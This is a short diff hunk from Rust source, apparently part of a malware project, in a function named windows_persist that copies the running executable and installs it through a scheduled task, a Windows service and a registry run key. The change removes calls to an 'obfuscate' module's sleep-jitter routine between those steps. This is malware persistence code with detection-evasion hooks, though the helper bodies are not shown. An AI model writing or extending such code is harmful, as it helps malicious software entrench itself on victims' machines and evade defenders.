@@ -51,11 +51,8 @@ fn windows_persist() -> std::io::Result<()> {
         fs::copy(&current_exe, &target_path)?;
     }
 
-    crate::obfuscate::sleep_jitter_default();
     scheduled_task(&target_path);
-    crate::obfuscate::sleep_jitter_default();
     windows_service(&target_path);
-    crate::obfuscate::sleep_jitter_default();
     registry_runkey(&target_path);
 
     Ok(())
